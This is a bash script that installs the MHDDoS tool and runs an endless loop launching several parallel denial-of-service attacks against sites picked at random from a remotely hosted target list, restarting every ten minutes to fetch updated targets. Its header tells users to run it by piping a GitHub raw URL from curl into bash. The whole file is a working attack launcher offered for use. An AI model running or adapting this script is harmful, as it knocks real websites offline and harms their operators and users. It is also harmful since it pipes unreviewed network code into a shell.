#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS.sh | bash   <<<<<
##### To kill script press CTRL+C several times.

## Restart script every N seconds (600s = 10m).
## It allows to download MHDDoS updates and target list updates.
## Also for some reaseon MHDDoS crashes quite often, so scheduled restarts eliminates that problem.
restart_interval=600

## Number of sites to attack simultaneously. Sites choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
num_of_targets=4

# Install git if it doesn't installed already
if [ ! -f /usr/bin/git ]; then
   sudo apt install git -y
fi

# Install python3 if it doesn't installed already
if [ ! -f /usr/bin/python3 ]; then
   sudo apt install python3 -y
fi

# Install pip if it doesn't installed already
if [ ! -f /usr/bin/pip ]; then
   apt install python3-pip  -y
fi


#No output. Resolved some problems with pip on debian
pip install --upgrade pip > /dev/null 

#Install latest version of MHDDoS
cd ~
rm -rf MHDDoS
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt > /dev/null #(no output on screen)

while true
echo "#####################################"
do
   # Get number of targets in MHDDoS_targets. First 5 strings ommited, those are reserved as comments.
   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | wc -l)
   
   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Create list with random numbers
   random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
   echo -e "random numbers: " $random_numbers "\n"
   
   # Print all randomly selected targets on screen
   echo -e "Choosen targets:\n"
   for i in $random_numbers
   do
             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6)")
             echo -e "-- "$site"\n"
   done
      
   # Launch multiple MHDDoS instances. Targets choosed based on previosly generated list of random numbers.
   for i in $random_numbers
   do
            # Get pre-random line from targets list
            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6)")
            
            # Cut "command line" from string. Command line is everything before "#" that is used as delimiter for comments purpose.
            cmd_line=$(echo $site | awk -F "#" '{print $1}')
            
            #echo $cmd_line
            
            python3 ~/MHDDoS/start.py $cmd_line&
   done
echo "#####################################"
sleep $restart_interval
echo -e "n RESTARTING\n"
pkill -f start.py
done
